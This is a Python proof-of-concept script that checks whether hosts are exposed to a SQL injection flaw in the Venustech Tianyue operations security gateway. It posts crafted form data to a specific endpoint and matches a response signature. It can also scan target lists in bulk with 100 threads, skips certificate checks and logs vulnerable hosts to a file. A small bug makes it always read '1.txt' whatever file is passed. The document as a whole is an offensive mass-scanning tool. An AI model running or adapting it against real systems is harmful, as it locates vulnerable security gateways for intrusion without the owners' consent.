import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""   ____    _ __  ____                _____ ____    __ 
  / __ \  (_)  |/  (_)___  ____ _   / ___// __ \  / / 
 / / / / / / /|_/ / / __ \/ __ `/   \__ \/ / / / / /  
/ /_/ / / / /  / / / / / / /_/ /   ___/ / /_/ / / /___
\___\_\/_/_/  /_/_/_/ /_/\__, /   /____/\___\_\/_____/
                        /____/                        """
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="启明星辰天玥运维安全网关SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = '/ops/index.php?c=Reportguide&a=checkrn'
    headers = {
        'Connection':'close',
        'Cache-Control':'max-age=0',
        'sec-ch-ua':'"Chromium";v="88","GoogleChrome";v="88",";NotABrand";v="99"',
        'sec-ch-ua-mobile':'?0',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/88.0.4324.96Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data = "checkname=123&tagid=123"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False)
        if res1.status_code==200 and '{"msg":"","code":16,"status":0}' in res1.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()